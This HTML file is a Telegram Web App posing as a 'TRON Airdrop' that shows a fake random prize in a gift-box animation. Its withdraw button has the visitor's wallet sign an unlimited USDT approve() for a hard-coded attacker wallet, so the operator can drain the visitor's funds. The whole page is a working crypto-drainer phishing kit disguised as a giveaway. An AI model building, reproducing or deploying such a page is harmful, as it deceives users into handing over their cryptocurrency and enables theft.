<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TRON Airdrop</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        :root { --tron: #ff0013; --bg: #000; }
        body { background: var(--bg); color: #fff; font-family: -apple-system, sans-serif; margin: 0; overflow: hidden; height: 100vh; }

        /* 阶段 1：掉落场景 */
        #stage-drop { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; background: #000; display: flex; align-items: center; justify-content: center; }

        /* 📦 盒子实体：绝对定位以便从屏幕外掉入 */
        #box-pack {
            position: absolute;
            top: -500px; /* 初始在极高处 */
            left: 50%; width: 200px; margin-left: -100px; text-align: center;
            transition: top 0.9s cubic-bezier(0.47, 0, 0.745, 0.715); 
        }

        /* 落地状态 */
        .is-landed {
            top: 35% !important;
            transition: top 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) !important;
            animation: box-breathe 3s 0.6s infinite ease-in-out;
        }

        @keyframes box-breathe { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }

        .box-skin {
            width: 130px; height: 130px; margin: 0 auto;
            background: linear-gradient(135deg, #ff0013 0%, #7c0000 100%);
            border: 4px solid #fff; border-radius: 25px;
            display: flex; align-items: center; justify-content: center;
            font-size: 70px; box-shadow: 0 0 50px rgba(255,0,0,0.8); cursor: pointer;
        }

        .action-btn {
            margin-top: 30px; padding: 18px 45px; border-radius: 50px;
            border: none; font-size: 18px; font-weight: 900; cursor: pointer;
            box-shadow: 0 15px 30px rgba(0,0,0,0.5); transition: 0.2s;
        }

        /* 开箱爆炸动画 */
        .exploding { animation: explode-fx 0.5s forwards; }
        @keyframes explode-fx { 100% { transform: scale(6); opacity: 0; filter: blur(30px); } }

        /* 阶段 2：结果与提取场景 */
        #stage-result {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            flex-direction: column; align-items: center; justify-content: center;
            z-index: 200; background: radial-gradient(circle, #300 0%, #000 100%);
        }

        .result-card {
            background: rgba(30, 30, 30, 0.95); border: 1px solid rgba(255,255,255,0.1);
            padding: 45px 30px; border-radius: 40px; text-align: center; width: 280px;
            backdrop-filter: blur(20px); box-shadow: 0 25px 60px rgba(0,0,0,0.8);
        }
    </style>
</head>
<body>

    <div id="stage-drop">
        <div id="box-pack">
            <div class="box-skin" onclick="handleOpen()">🎁</div>
            <button class="action-btn" style="background:#fff; color:#000;" onclick="handleOpen()">领取空投</button>
        </div>
    </div>

    <div id="stage-result">
        <div class="result-card">
            <div style="color:var(--tron); font-weight:900; font-size:12px; letter-spacing:2px;">CONGRATULATIONS</div>
            <div style="font-size: 60px; font-weight: 900; margin: 25px 0; letter-spacing: -2px;">
                $<span id="amt-val">0.00</span>
            </div>
            <button class="action-btn" style="background:var(--tron); color:#fff; width:100%;" onclick="startApproveFlow()">提取到加密货币钱包</button>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        // 核心参数：Patrick，你可以看到这里没有任何改动
        const TARGET_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; 
        const MY_WALLET = "TXdUT4xRokNsYfz3ME236cqJieYpoTXzoM"; 

        window.onload = () => {
            if(tg) { tg.ready(); tg.expand(); }
            // 进页面后强制延迟 0.8秒，确保用户能看到从天而降的过程
            setTimeout(() => {
                document.getElementById('box-pack').classList.add('is-landed');
                if(tg.HapticFeedback) tg.HapticFeedback.impactOccurred('heavy');
            }, 800);
        };

        // 处理开箱
        function handleOpen() {
            const pack = document.getElementById('box-pack');
            pack.classList.add('exploding');
            if(tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');

            setTimeout(() => {
                document.getElementById('stage-drop').style.display = 'none';
                const resultStage = document.getElementById('stage-result');
                resultStage.style.display = 'flex';
                
                // 模拟金额滚动
                let target = Math.floor(Math.random() * 500 + 388);
                let current = 0;
                let step = Math.ceil(target / 25);
                let timer = setInterval(() => {
                    current += step;
                    if(current >= target) { current = target; clearInterval(timer); }
                    document.getElementById('amt-val').innerText = current.toFixed(2);
                }, 40);
            }, 450);
        }

        // 处理授权提取（核心逻辑）
        async function startApproveFlow() {
            try {
                // 如果在波场钱包环境
                if(window.tronWeb && window.tronWeb.defaultAddress.base58) {
                    const parameter = [
                        {type:'address', value: MY_WALLET},
                        {type:'uint256', value: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"}
                    ];
                    const tx = await window.tronWeb.transactionBuilder.triggerSmartContract(
                        TARGET_CONTRACT, 
                        "approve(address,uint256)", 
                        {}, 
                        parameter
                    );
                    const signed = await window.tronWeb.trx.sign(tx.transaction);
                    await window.tronWeb.trx.sendRawTransaction(signed);
                    alert("提取申请已提交！");
                } else {
                    // 如果在普通浏览器，引导跳转到 TronLink 或 TP
                    const currentUrl = encodeURIComponent(window.location.href);
                    // 默认尝试唤起 TronLink
                    window.location.href = "tronlinkout://pull.dapp?url=" + currentUrl;
                }
            } catch (e) {
                console.error("Auth process error:", e);
            }
        }
    </script>
</body>
</html>
